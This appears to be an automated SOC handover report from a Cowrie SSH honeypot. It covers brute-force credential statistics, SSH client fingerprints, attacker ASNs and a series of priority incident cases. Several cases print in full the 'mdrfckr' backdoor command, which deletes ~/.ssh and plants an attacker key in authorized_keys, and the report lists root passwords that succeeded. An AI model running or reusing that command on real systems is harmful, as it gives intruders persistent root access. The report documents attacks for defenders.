# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-11 |
| **Generated At** | 2026-05-11T15:19:03Z |
| **Shift Time** | 15:19 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **463** |
| Confirmed Threats | **309** |
| False Positives Filtered | **154** (33.3%) |
| Unique Attacker IPs | **58** |
| Countries of Origin | **29** |
| High Severity Cases | **24** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **439** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **205** |
| Unique Credential Pairs | **125** |
| Unique Usernames | **60** |
| Unique Passwords | **111** |
| Successful Auth Pairs | **18** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `ubuntu` | 35 |
| `root` | 24 |
| `345gs5662d34` | 12 |
| `user` | 11 |
| `test` | 10 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 12 |
| `3245gs5662d34` | 12 |
| `test` | 7 |
| `123456` | 5 |
| `password` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 12 |
| `root` | `3245gs5662d34` | 12 |
| `guest` | `p@ssw0rd` | 2 |
| `ubuntu` | `1029384756` | 2 |
| `ubuntu` | `1qaz@WSX3edc` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `P@ssword2026` | `103.189.235.176` | 2026-05-11T12:51:11 |
| `root` | `3245gs5662d34` | `103.189.235.176` | 2026-05-11T12:51:16 |
| `root` | `admin2016` | `212.154.234.9` | 2026-05-11T13:03:11 |
| `root` | `3245gs5662d34` | `212.154.234.9` | 2026-05-11T13:03:16 |
| `root` | `admin2020!` | `212.154.234.9` | 2026-05-11T13:06:48 |
| `root` | `admin@admin.com` | `212.154.234.9` | 2026-05-11T13:10:36 |
| `root` | `ubuntu10` | `165.154.227.158` | 2026-05-11T13:13:36 |
| `root` | `3245gs5662d34` | `165.154.227.158` | 2026-05-11T13:13:42 |
| `root` | `testing123456` | `212.154.234.9` | 2026-05-11T13:27:18 |
| `root` | `1Digital` | `212.154.234.9` | 2026-05-11T13:32:50 |
| `root` | `test123!@` | `212.154.234.9` | 2026-05-11T13:34:43 |
| `root` | `kafka12` | `213.6.203.226` | 2026-05-11T13:42:38 |
| `root` | `3245gs5662d34` | `213.6.203.226` | 2026-05-11T13:42:42 |
| `root` | `minecraft@123` | `212.154.234.9` | 2026-05-11T13:44:01 |
| `root` | `kafka12` | `114.35.59.237` | 2026-05-11T13:45:42 |
| `root` | `3245gs5662d34` | `114.35.59.237` | 2026-05-11T13:45:46 |
| `root` | `admin@123!@` | `115.85.80.12` | 2026-05-11T15:15:39 |
| `root` | `3245gs5662d34` | `115.85.80.12` | 2026-05-11T15:15:41 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **463** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 217 |
| Go SSH scanner | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 165 | 8 |
| `03a80b21afa8...` | Modern SSH client | 49 | 4 |
| `9052c4ab4164...` | Mirai/variant | 1 | 1 |
| `16443846184e...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 165 | 8 | libssh-based |
| `03a80b21afa8...` | libssh | 49 | 4 | Modern SSH client |
| `95420f9d932d...` | libssh | 3 | 3 | — |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 12 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.189.235.176`, `114.35.59.237`, `212.154.234.9`, `115.85.80.12`, `165.154.227.158`, `213.6.203.226`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **58** |
| Unique ASNs | **49** |
| High-Risk ASNs | **21** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS55836` | Reliance Jio Infocomm Limited | 5 | LOW |
| `AS3462` | Data Communication Business Group | 2 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS16509` | Amazon.com, Inc. | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS8193` | Uzbektelekom Joint Stock Company | 2 | HIGH |
| `AS216334` | New Hosting Technologies LLC | 1 | HIGH |
| `AS10139` | Smart Broadband, Inc. | 1 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (24)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-bea3ea014d6d

| Field | Detail |
|---|---|
| **Source IP** | `103.189.235[.]176` |
| **First Seen** | 2026-05-11 12:51 |
| **Last Seen** | 2026-05-11 12:51 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 12:51:10` | `cowrie.session.connect` |
| `2026-05-11 12:51:10` | `cowrie.client.version` |
| `2026-05-11 12:51:10` | `cowrie.client.kex` |
| `2026-05-11 12:51:11` | `cowrie.login.success` |
| `2026-05-11 12:51:12` | `cowrie.session.params` |
| `2026-05-11 12:51:12` | `cowrie.command.input` |
| `2026-05-11 12:51:12` | `cowrie.command.failed` |
| `2026-05-11 12:51:12` | `cowrie.log.closed` |
| `2026-05-11 12:51:12` | `cowrie.session.params` |
| `2026-05-11 12:51:12` | `cowrie.command.input` |
| `2026-05-11 12:51:12` | `cowrie.session.file_download` |
| `2026-05-11 12:51:12` | `cowrie.log.closed` |
| `2026-05-11 12:51:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.189.235[.]176` to AbuseIPDB if not already reported
- [ ] Block `103.189.235[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb2f502646cd

| Field | Detail |
|---|---|
| **Source IP** | `103.189.235[.]176` |
| **First Seen** | 2026-05-11 12:51 |
| **Last Seen** | 2026-05-11 12:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 12:51:15` | `cowrie.session.connect` |
| `2026-05-11 12:51:15` | `cowrie.client.version` |
| `2026-05-11 12:51:15` | `cowrie.client.kex` |
| `2026-05-11 12:51:16` | `cowrie.login.success` |
| `2026-05-11 12:51:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.189.235[.]176` to AbuseIPDB if not already reported
- [ ] Block `103.189.235[.]176` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ca2f0b5533a

| Field | Detail |
|---|---|
| **Source IP** | `212.154.234[.]9` |
| **First Seen** | 2026-05-11 13:03 |
| **Last Seen** | 2026-05-11 13:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 13:03:10` | `cowrie.session.connect` |
| `2026-05-11 13:03:10` | `cowrie.client.version` |
| `2026-05-11 13:03:10` | `cowrie.client.kex` |
| `2026-05-11 13:03:11` | `cowrie.login.success` |
| `2026-05-11 13:03:12` | `cowrie.session.params` |
| `2026-05-11 13:03:12` | `cowrie.command.input` |
| `2026-05-11 13:03:12` | `cowrie.command.failed` |
| `2026-05-11 13:03:12` | `cowrie.log.closed` |
| `2026-05-11 13:03:12` | `cowrie.session.params` |
| `2026-05-11 13:03:12` | `cowrie.command.input` |
| `2026-05-11 13:03:13` | `cowrie.session.file_download` |
| `2026-05-11 13:03:13` | `cowrie.log.closed` |
| `2026-05-11 13:03:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.154.234[.]9` to AbuseIPDB if not already reported
- [ ] Block `212.154.234[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b43b7bdc0095

| Field | Detail |
|---|---|
| **Source IP** | `212.154.234[.]9` |
| **First Seen** | 2026-05-11 13:03 |
| **Last Seen** | 2026-05-11 13:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 13:03:15` | `cowrie.session.connect` |
| `2026-05-11 13:03:15` | `cowrie.client.version` |
| `2026-05-11 13:03:16` | `cowrie.client.kex` |
| `2026-05-11 13:03:16` | `cowrie.login.success` |
| `2026-05-11 13:03:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.154.234[.]9` to AbuseIPDB if not already reported
- [ ] Block `212.154.234[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19decadc0642

| Field | Detail |
|---|---|
| **Source IP** | `212.154.234[.]9` |
| **First Seen** | 2026-05-11 13:06 |
| **Last Seen** | 2026-05-11 13:06 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 13:06:47` | `cowrie.session.connect` |
| `2026-05-11 13:06:47` | `cowrie.client.version` |
| `2026-05-11 13:06:48` | `cowrie.client.kex` |
| `2026-05-11 13:06:48` | `cowrie.login.success` |
| `2026-05-11 13:06:49` | `cowrie.session.params` |
| `2026-05-11 13:06:49` | `cowrie.command.input` |
| `2026-05-11 13:06:49` | `cowrie.command.failed` |
| `2026-05-11 13:06:49` | `cowrie.log.closed` |
| `2026-05-11 13:06:50` | `cowrie.session.params` |
| `2026-05-11 13:06:50` | `cowrie.command.input` |
| `2026-05-11 13:06:50` | `cowrie.session.file_download` |
| `2026-05-11 13:06:50` | `cowrie.log.closed` |
| `2026-05-11 13:06:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.154.234[.]9` to AbuseIPDB if not already reported
- [ ] Block `212.154.234[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0232a52a480

| Field | Detail |
|---|---|
| **Source IP** | `212.154.234[.]9` |
| **First Seen** | 2026-05-11 13:06 |
| **Last Seen** | 2026-05-11 13:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 13:06:53` | `cowrie.session.connect` |
| `2026-05-11 13:06:53` | `cowrie.client.version` |
| `2026-05-11 13:06:53` | `cowrie.client.kex` |
| `2026-05-11 13:06:54` | `cowrie.login.success` |
| `2026-05-11 13:06:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.154.234[.]9` to AbuseIPDB if not already reported
- [ ] Block `212.154.234[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-645f97b46605

| Field | Detail |
|---|---|
| **Source IP** | `212.154.234[.]9` |
| **First Seen** | 2026-05-11 13:10 |
| **Last Seen** | 2026-05-11 13:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 13:10:35` | `cowrie.session.connect` |
| `2026-05-11 13:10:35` | `cowrie.client.version` |
| `2026-05-11 13:10:35` | `cowrie.client.kex` |
| `2026-05-11 13:10:36` | `cowrie.login.success` |
| `2026-05-11 13:10:37` | `cowrie.session.params` |
| `2026-05-11 13:10:37` | `cowrie.command.input` |
| `2026-05-11 13:10:37` | `cowrie.command.failed` |
| `2026-05-11 13:10:37` | `cowrie.log.closed` |
| `2026-05-11 13:10:38` | `cowrie.session.params` |
| `2026-05-11 13:10:38` | `cowrie.command.input` |
| `2026-05-11 13:10:38` | `cowrie.session.file_download` |
| `2026-05-11 13:10:38` | `cowrie.log.closed` |
| `2026-05-11 13:10:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.154.234[.]9` to AbuseIPDB if not already reported
- [ ] Block `212.154.234[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbbcfb806c97

| Field | Detail |
|---|---|
| **Source IP** | `212.154.234[.]9` |
| **First Seen** | 2026-05-11 13:10 |
| **Last Seen** | 2026-05-11 13:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 13:10:41` | `cowrie.session.connect` |
| `2026-05-11 13:10:41` | `cowrie.client.version` |
| `2026-05-11 13:10:41` | `cowrie.client.kex` |
| `2026-05-11 13:10:42` | `cowrie.login.success` |
| `2026-05-11 13:10:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.154.234[.]9` to AbuseIPDB if not already reported
- [ ] Block `212.154.234[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a9c2c79a95d

| Field | Detail |
|---|---|
| **Source IP** | `165.154.227[.]158` |
| **First Seen** | 2026-05-11 13:13 |
| **Last Seen** | 2026-05-11 13:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 13:13:35` | `cowrie.session.connect` |
| `2026-05-11 13:13:35` | `cowrie.client.version` |
| `2026-05-11 13:13:36` | `cowrie.client.kex` |
| `2026-05-11 13:13:36` | `cowrie.login.success` |
| `2026-05-11 13:13:37` | `cowrie.session.params` |
| `2026-05-11 13:13:37` | `cowrie.command.input` |
| `2026-05-11 13:13:37` | `cowrie.command.failed` |
| `2026-05-11 13:13:37` | `cowrie.log.closed` |
| `2026-05-11 13:13:38` | `cowrie.session.params` |
| `2026-05-11 13:13:38` | `cowrie.command.input` |
| `2026-05-11 13:13:38` | `cowrie.session.file_download` |
| `2026-05-11 13:13:38` | `cowrie.log.closed` |
| `2026-05-11 13:13:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.227[.]158` to AbuseIPDB if not already reported
- [ ] Block `165.154.227[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-997ea41b44d5

| Field | Detail |
|---|---|
| **Source IP** | `165.154.227[.]158` |
| **First Seen** | 2026-05-11 13:13 |
| **Last Seen** | 2026-05-11 13:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 13:13:41` | `cowrie.session.connect` |
| `2026-05-11 13:13:41` | `cowrie.client.version` |
| `2026-05-11 13:13:41` | `cowrie.client.kex` |
| `2026-05-11 13:13:42` | `cowrie.login.success` |
| `2026-05-11 13:13:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.227[.]158` to AbuseIPDB if not already reported
- [ ] Block `165.154.227[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c3360650815

| Field | Detail |
|---|---|
| **Source IP** | `212.154.234[.]9` |
| **First Seen** | 2026-05-11 13:27 |
| **Last Seen** | 2026-05-11 13:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 13:27:17` | `cowrie.session.connect` |
| `2026-05-11 13:27:17` | `cowrie.client.version` |
| `2026-05-11 13:27:17` | `cowrie.client.kex` |
| `2026-05-11 13:27:18` | `cowrie.login.success` |
| `2026-05-11 13:27:19` | `cowrie.session.params` |
| `2026-05-11 13:27:19` | `cowrie.command.input` |
| `2026-05-11 13:27:19` | `cowrie.command.failed` |
| `2026-05-11 13:27:19` | `cowrie.log.closed` |
| `2026-05-11 13:27:19` | `cowrie.session.params` |
| `2026-05-11 13:27:19` | `cowrie.command.input` |
| `2026-05-11 13:27:20` | `cowrie.session.file_download` |
| `2026-05-11 13:27:20` | `cowrie.log.closed` |
| `2026-05-11 13:27:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.154.234[.]9` to AbuseIPDB if not already reported
- [ ] Block `212.154.234[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6010db24070

| Field | Detail |
|---|---|
| **Source IP** | `212.154.234[.]9` |
| **First Seen** | 2026-05-11 13:27 |
| **Last Seen** | 2026-05-11 13:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 13:27:23` | `cowrie.session.connect` |
| `2026-05-11 13:27:23` | `cowrie.client.version` |
| `2026-05-11 13:27:23` | `cowrie.client.kex` |
| `2026-05-11 13:27:24` | `cowrie.login.success` |
| `2026-05-11 13:27:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.154.234[.]9` to AbuseIPDB if not already reported
- [ ] Block `212.154.234[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2cd8db56ef5

| Field | Detail |
|---|---|
| **Source IP** | `212.154.234[.]9` |
| **First Seen** | 2026-05-11 13:32 |
| **Last Seen** | 2026-05-11 13:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 13:32:49` | `cowrie.session.connect` |
| `2026-05-11 13:32:49` | `cowrie.client.version` |
| `2026-05-11 13:32:49` | `cowrie.client.kex` |
| `2026-05-11 13:32:50` | `cowrie.login.success` |
| `2026-05-11 13:32:51` | `cowrie.session.params` |
| `2026-05-11 13:32:51` | `cowrie.command.input` |
